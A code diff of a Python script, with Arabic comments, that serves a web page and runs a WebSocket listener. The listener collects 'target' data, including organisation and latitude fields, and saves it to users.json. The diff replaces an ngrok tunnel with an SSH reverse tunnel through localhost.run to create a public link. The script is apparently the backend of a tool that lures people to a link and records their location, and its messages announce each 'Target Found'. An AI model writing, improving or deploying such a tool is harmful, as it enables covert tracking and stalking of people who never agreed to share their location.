@@ -2,58 +2,51 @@ import asyncio
 import json
 import time
 import threading
-from http.server import HTTPServer , SimpleHTTPRequestHandler
+import subprocess
+from http.server import HTTPServer, SimpleHTTPRequestHandler
 import websockets
-from pyngrok import ngrok # تأكد من تثبيتها عبر pip install pyngrok
 
 USER_FILE = "users.json"
 HTTP_PORT = 8000
 WS_PORT = 8765
 
-def load_users():
-    try:
-        with open(USER_FILE,'r',encoding='utf-8') as f:
-            return json.load(f)
-    except:
-        return []
-
 def save_user(user):
-    users = load_users()
-    for u in users:
-        if u["org"] == user["org"] and u["lat"] == user["lat"]:
-            return
+    try:
+        with open(USER_FILE, 'r') as f: users = json.load(f)
+    except: users = []
     users.append(user)
-    with open(USER_FILE,'w',encoding='utf-8') as f :
-        json.dump(users,f,indent=2)
+    with open(USER_FILE, 'w') as f: json.dump(users, f, indent=2)
 
 async def ws_handler(ws):
-    data = await ws.recv()
-    user = json.loads(data)
-    user["time"] = time.strftime("%Y-%m-%d %H:%M:%S")
-    save_user(user)
-    print('OK - Target Data Received!')
+    try:
+        data = await ws.recv()
+        user = json.loads(data)
+        user["time"] = time.strftime("%Y-%m-%d %H:%M:%S")
+        save_user(user)
+        print("\n[+] Target Found!")
+    except: pass
 
 async def start_ws():
-    async with websockets.serve(ws_handler,"0.0.0.0",WS_PORT):
+    async with websockets.serve(ws_handler, "0.0.0.0", WS_PORT):
         await asyncio.Future()
 
 def start_http():
-    server = HTTPServer(("0.0.0.0", HTTP_PORT),SimpleHTTPRequestHandler)
+    server = HTTPServer(("0.0.0.0", HTTP_PORT), SimpleHTTPRequestHandler)
     server.serve_forever()
 
 if __name__ == "__main__":
-    # --- كود الـ Webview والرابط التلقائي ---
-    print("[*] Generating Public WebView Link...")
-    public_url = ngrok.connect(HTTP_PORT).public_url
-    ws_url = public_url.replace("http", "ws")
+    # تشغيل السيرفرات في الخلفية
+    threading.Thread(target=start_http, daemon=True).start()
     
-    # حفظ الرابط لكي يستخدمه العميل تلقائياً
-    with open("config.js", "w") as f:
-        f.write(f'const SERVER_LINK = "{ws_url}";')
+    print("\n" + "="*40)
+    print("[*] Generating Public Link (Please Wait...)")
+    print("="*40)
 
-    print("\n" + "="*50)
-    print(f"🔗 Your WebView Link: {public_url}")
-    print("="*50 + "\n")
+    # فتح نفق تلقائي بدون Ngrok وبدون حساب (باستخدام Localhost.run)
+    # ملاحظة: هذا الأمر يحتاج وجود ssh مثبت في جهازك (موجود تلقائياً في أغلب الأنظمة)
+    os_command = f"ssh -R 80:localhost:{HTTP_PORT} localhost.run"
+    print(f"\n[!] RUN THIS IN A NEW TERMINAL TO GET LINK:")
+    print(f"👉 {os_command}")
+    print("\n" + "="*40)
 
-    threading.Thread(target=start_http,daemon=True).start()
     asyncio.run(start_ws())
